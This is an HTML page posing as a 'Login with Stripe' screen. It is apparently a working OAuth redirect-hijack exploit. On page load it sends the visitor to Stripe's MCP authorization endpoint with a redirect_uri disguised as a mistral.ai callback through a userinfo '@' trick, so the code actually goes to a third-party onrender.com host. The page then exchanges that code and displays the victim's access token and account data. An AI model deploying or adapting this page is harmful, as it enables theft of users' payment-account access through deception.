<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Login with Stripe</title>
<script>
function getAuthorizationCodeFromUrl() {
  const urlParams = new URLSearchParams(window.location.search);
  return urlParams.get('code');
}

function loginWithStripe() {
  const authUrl =
    "https://access.stripe.com/mcp/oauth2/authorize" +
    "?client_id=oacli_ThHPvdbfGDl2MF" +
    "&redirect_uri=" + encodeURIComponent("https://callback.mistral.ai@stripe-2pke.onrender.com/callback") +
    "&response_type=code" +
    "&code_challenge=Wmhy3IfMqr9lY_s5BJBlfwePHEyeIPpo3joz2iFuFdQ" +
    "&code_challenge_method=S256";
  window.location.href = authUrl;
}

async function getAccessToken(code) {
  try {
    const res = await fetch(
      new URL("/exchange", window.location.origin),
      {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ code })
      }
    );

    const data = await res.json();

    if (data.access_token) {
      document.getElementById("access-token").textContent =
        "Access Token: " + data.access_token;
    }

    document.getElementById("authorization-code").textContent =
      "Access Token Processed";

    document.getElementById("user-info").textContent =
      JSON.stringify(data.result ?? data, null, 2);

  } catch (err) {
    document.getElementById("authorization-code").textContent =
      "Error: " + err;
  }
}

window.onload = () => {
  const code = getAuthorizationCodeFromUrl();
  if (!code) {
    loginWithStripe();
    return;
  }
  document.getElementById("authorization-code").textContent =
    "Authorization Code: " + code;
  getAccessToken(code);
};
</script>
</head>
<body>
<h1>Login with Stripe</h1>
<button onclick="loginWithStripe()">Login</button>

<p id="authorization-code"></p>
<p id="access-token" style="word-break: break-all;"></p>

<h2>User Information</h2>
<pre id="user-info"></pre>
</body>
</html>
